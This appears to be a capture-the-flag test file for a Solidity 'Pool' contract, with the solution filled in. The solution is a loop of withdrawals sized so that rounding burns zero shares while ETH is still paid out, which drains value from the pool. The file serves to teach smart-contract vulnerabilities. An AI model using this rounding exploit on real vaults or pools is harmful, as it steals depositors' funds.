import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { network } from "hardhat";
import { parseEther, parseGwei } from "viem";

describe("CTF", async function () {
  const { viem } = await network.create();
  const publicClient = await viem.getPublicClient();
  const [deployer, alice, player] = await viem.getWalletClients();

  it("drain the pool", async function () {
    // Setup: Alice seeds the pool, then it earns fees.
    const pool = await viem.deployContract("Pool");
    await pool.write.deposit({ account: alice.account, value: parseGwei("1") });
    await deployer.sendTransaction({ to: pool.address, value: parseEther("10") });

    const assetsBefore = await publicClient.getBalance({ address: pool.address });
    const sharesBefore = await pool.read.totalShares();

    // ---- YOUR EXPLOIT HERE (use `player` only) ----
    // `withdraw` computes shares = floor(assets * totalShares / totalAssets).
    // One share is worth ~1e10 wei, so asking for slightly less than one
    // share's worth of ETH burns 0 shares while still paying out the ETH.
    // The player holds no shares, so `sharesOf[player] -= 0` doesn't revert.
    for (let i = 0; i < 5; i++) {
      const totalShares = await pool.read.totalShares();
      const totalAssets = await publicClient.getBalance({ address: pool.address });
      // Largest `assets` with assets * totalShares < totalAssets → 0 shares.
      const freeAssets = (totalAssets - 1n) / totalShares;
      await pool.write.withdraw([freeAssets], { account: player.account });
    }

    // ---- END OF EXPLOIT ----

    const assetsAfter = await publicClient.getBalance({ address: pool.address });
    const sharesAfter = await pool.read.totalShares();

    // The value of a share must never decrease. You win if it did.
    assert.ok(
      assetsAfter * sharesBefore < assetsBefore * sharesAfter,
      "pool is still balanced: the value of a share did not decrease",
    );
  });
});
